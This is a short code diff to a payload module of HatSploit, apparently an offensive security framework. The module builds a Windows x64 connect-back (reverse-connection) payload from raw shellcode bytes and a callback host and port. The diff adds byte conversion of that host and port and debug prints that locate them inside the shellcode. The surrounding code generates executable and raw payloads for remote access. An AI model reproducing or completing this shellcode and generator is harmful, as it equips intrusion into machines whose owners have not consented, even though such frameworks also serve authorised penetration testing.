@@ -46,6 +46,9 @@ class HatSploitPayload(Payload, HatVenom):
     def run(self):
         connback_host, connback_port = self.parse_options(self.options)
 
+        ip = self.ip_bytes(connback_host)
+        port = self.port_bytes(connback_port)
+
         '''
         offsets = {
             'cbhost': connback_host,
@@ -85,6 +88,9 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
             b"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
         )
+        
+        print(ip, port)
+        print(shellcode.find(ip), shellcode.find(port))
 
         payload = self.generate('pe', 'x64', shellcode)#, offsets)
         raw_payload = self.generate('raw', 'generic', shellcode)#, offsets)
